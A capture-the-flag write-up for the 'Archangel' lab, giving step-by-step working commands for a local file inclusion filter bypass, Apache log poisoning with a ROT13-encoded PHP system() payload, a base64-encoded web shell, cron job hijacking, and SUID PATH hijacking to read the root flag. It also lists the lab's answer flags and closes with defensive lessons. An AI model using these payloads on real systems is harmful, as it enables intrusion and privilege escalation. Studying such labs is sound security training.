# Archangel CTF Writeup

**Target IP:** 10.48.174.89
**Hostname:** mafialive.thm

---

## 1. Initial Enumeration

### Nmap Scan
The scan identified two open ports:
- **Port 22 (SSH):** OpenSSH 7.6p1
- **Port 80 (HTTP):** Apache 2.4.29

### Web Reconnaissance
Accessing `http://mafialive.thm` revealed a development page.
- **Flag 1:** Found in the source of the homepage: `thm{f0und_th3_r1ght_h0st_n4m3}`.
- **Robots.txt:** Revealed a restricted test page at `/test.php`.

---

## 2. Local File Inclusion (LFI) & Source Disclosure

The `/test.php` page used a `view` parameter to include files. However, it implemented a strict filter that required the presence of `/var/www/html/development_testing` and blocked the string `../..`.

### Bypassing the Path Filter
To read the source code of `test.php`, I used a PHP filter chain. I embedded the required path as a "dummy" directory in the filter wrapper to satisfy the check:
`curl -s "http://mafialive.thm/test.php?view=php://filter/read=convert.base64-encode/var/www/html/development_testing/resource=test.php"`

Decoding the resulting Base64 revealed the source code and **Flag 2**: `thm{explo1t1ng_lf1}`.

### Directory Traversal Bypass
The source code confirmed that the filter blocked `../..` but not `..//..`. Using this, I was able to traverse out of the restricted directory and read the user flag:
`curl -s "http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//home/archangel/user.txt"`
- **User Flag:** `thm{lf1_t0_rc3_1s_tr1cky}`

---

## 3. Remote Code Execution (RCE) via Log Poisoning

The LFI allowed me to read the Apache access logs at `/var/log/apache2/access.log`.

### Bypassing Log Escaping
Directly injecting `<?php system($_GET['cmd']); ?>` failed because Apache escaped the double quotes in the log, causing a PHP syntax error. To bypass this, I used the `string.rot13` filter.

1.  **Injecting ROT13 Payload:**
    I sent a request with a pre-rotated payload in the User-Agent header:
    `curl -A "<?cuc flfgrz(\$_TRG['p']); qvr(); ?>" http://mafialive.thm/`
    *(Rotates back to: `<?php system($_GET['p']); die(); ?>`)*

2.  **Executing the Poisoned Log:**
    I included the log file while applying the ROT13 filter to the entire stream:
    `curl -s "http://mafialive.thm/test.php?view=php://filter/read=string.rot13/resource=/var/www/html/development_testing/..//..//..//..//..//..//var/log/apache2/access.log&p=id"`

### Establishing a Web Shell
Once RCE was confirmed, I dropped a persistent PHP web shell into the world-writable development directory for easier access:
`curl -s "...&p=echo+PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8%2B+%7C+base64+-d+%3E+shell.php"`

---

## 4. Horizontal Privilege Escalation (archangel)

Enumeration via the web shell revealed a cron job running every minute as the user `archangel`:
`*/1 * * * * archangel /opt/helloworld.sh`

### Hijacking the Cron Job
Since `/opt/helloworld.sh` was world-writable, I appended a command to exfiltrate the contents of the `secret` directory into the web root:
```bash
echo 'cp -r /home/archangel/secret/* /var/www/html/development_testing/secret_backup/' >> /opt/helloworld.sh
echo 'chmod -R 777 /var/www/html/development_testing/secret_backup/' >> /opt/helloworld.sh
```

After one minute, I accessed the exfiltrated files:
- **User 2 Flag:** `thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}` (Found in `user2.txt`)

---

## 5. Vertical Privilege Escalation (root)

Inside the `secret` directory, I found a SUID binary named `backup`. Running `strings` on it showed it was executing a `cp` command using a relative path:
`cp /home/user/archangel/myfiles/* /opt/backupfiles`

### Path Hijacking Exploit
I exploited this by hijacking the `PATH` variable to point to a malicious `cp` executable.

1.  **Creating the Malicious Binary:**
    The `backup` binary required the source directory to exist to trigger the `cp` call. I updated the cron job to perform the exploit:
    ```bash
    # Create the directory the binary expects
    mkdir -p /home/user/archangel/myfiles
    touch /home/user/archangel/myfiles/dummy

    # Create malicious 'cp' that reads the root flag
    echo 'cat /root/root.txt > /var/www/html/development_testing/root.txt' > /tmp/cp
    chmod 777 /tmp/cp

    # Execute 'backup' with hijacked PATH
    export PATH=/tmp:$PATH
    /home/archangel/secret/backup
    ```

2.  **Retrieving the Flag:**
    After the cron job ran, the root flag was written to the web root.
- **Root Flag:** `thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}`

---

## Lessons Learned
- **Input Validation:** LFI filters should never rely on simple string blacklisting (like `../..`), as they are easily bypassed by double-slashes or encoding.
- **Log Security:** Log files should not be readable by the web server user to prevent log poisoning.
- **Insecure File Permissions:** World-writable scripts (`/opt/helloworld.sh`) are a direct path to privilege escalation.
- **Relative Paths in SUID:** SUID binaries must always use absolute paths for system commands to prevent PATH hijacking.